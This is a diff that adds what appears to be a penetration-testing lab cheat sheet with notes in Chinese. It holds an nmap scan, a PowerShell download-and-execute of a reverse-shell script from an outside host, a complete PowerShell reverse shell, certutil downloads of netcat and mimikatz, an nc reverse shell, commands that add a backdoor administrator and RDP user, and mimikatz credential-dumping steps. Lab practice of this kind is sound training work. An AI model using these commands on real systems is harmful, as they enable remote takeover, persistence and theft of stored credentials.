@@ -1,0 +1,27 @@
+nmap 10.11.1.223 -sC -sV -Pn > nmap.txt
+
+
+powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.197/Invoke-PowerShellTcp.ps1')
+powershell -w hidden -nop -c $a='192.168.119.197';$b=4444;$c=New-Object system.net.sockets.tcpclient;$nb=New-Object System.Byte[] $c.ReceiveBufferSize;$ob=New-Object System.Byte[] 65536;$eb=New-Object System.Byte[] 65536;$e=new-object System.Text.UTF8Encoding;$p=New-Object System.Diagnostics.Process;$p.StartInfo.FileName='cmd.exe';$p.StartInfo.RedirectStandardInput=1;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.RedirectStandardError=1;$p.StartInfo.UseShellExecute=0;$q=$p.Start();$is=$p.StandardInput;$os=$p.StandardOutput;$es=$p.StandardError;$osread=$os.BaseStream.BeginRead($ob, 0, $ob.Length, $null, $null);$esread=$es.BaseStream.BeginRead($eb, 0, $eb.Length, $null, $null);$c.connect($a,$b);$s=$c.GetStream();while ($true) {    start-sleep -m 100;    if ($osread.IsCompleted -and $osread.Result -ne 0) {      $r=$os.BaseStream.EndRead($osread);      $s.Write($ob,0,$r);      $s.Flush();      $osread=$os.BaseStream.BeginRead($ob, 0, $ob.Length, $null, $null);    }    if ($esread.IsCompleted -and $esread.Result -ne 0) {      $r=$es.BaseStream.EndRead($esread);      $s.Write($eb,0,$r);      $s.Flush();      $esread=$es.BaseStream.BeginRead($eb, 0, $eb.Length, $null, $null);    }    if ($s.DataAvailable) {      $r=$s.Read($nb,0,$nb.Length);      if ($r -lt 1) {          break;      } else {          $str=$e.GetString($nb,0,$r);          $is.write($str);      }    }    if ($c.Connected -ne $true -or ($c.Client.Poll(1,[System.Net.Sockets.SelectMode]::SelectRead) -and $c.Client.Available -eq 0)) {        break;    }    if ($p.ExitCode -ne $null) {        break;    }}
+certutil.exe -urlcache -split -f http://192.168.119.134/nc32.exe nc32.exe
+nc32.exe 192.168.119.197  4444 -e cmd.exe
+certutil.exe -urlcache -split -f http://192.168.119.134/mimikatz.exe mimikatz.exe
+
+
+1.nmap掃描到80端發口發現有MicroBlog服務
+2.seachexploit發現前版本有remote code execution漏洞可取得shell
+3.shell怪怪的,雖然是administrator的,使用指令創建用戶登入
+nt authority\system
+> net user timmy timmy /add
+The command completed successfully.
+> net  localgroup "Remote Desktop Users" "timmy" /add
+The command completed successfully.
+> net  localgroup "Administrators" "timmy" /add
+The command completed successfully.
+
+
+1.檢查有無權限privilege::debug
+2.若有報錯需要使用mimikatz_trunk
+3.sekurlsa::logonpasswords
+4.sekurlsa::tickets
+5.lsadump::sam
